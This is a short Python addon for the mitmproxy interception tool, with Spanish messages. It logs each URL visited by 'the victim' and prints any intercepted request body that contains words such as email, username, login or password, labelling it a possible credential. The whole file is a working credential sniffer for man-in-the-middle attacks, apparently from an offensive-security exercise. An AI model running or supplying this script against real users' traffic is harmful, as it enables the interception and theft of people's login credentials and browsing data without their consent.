#!/usr/bin/env python3
from mitmproxy import http
from urllib.parse import urlparse

def has_keywords(data, keywords):
 for keyword in keywords:
  if keyword in data:
   return True
 return False

def request(packet):
    url = packet.request.url
    parsed_url = urlparse(url)
    sheme = parsed_url.scheme
    domain = parsed_url.netloc
    path = parsed_url.path
    print(f"[+]URL visitada por la víctima: {sheme}://{domain}{path}")

    keywords = ["email", "username", "user", "login", "password", "pass"]
    data = packet.request.get_text()

    if has_keywords(data, keywords):
        print(f"\n\n[+]Posible credencial encontrada: {data}\n\n")

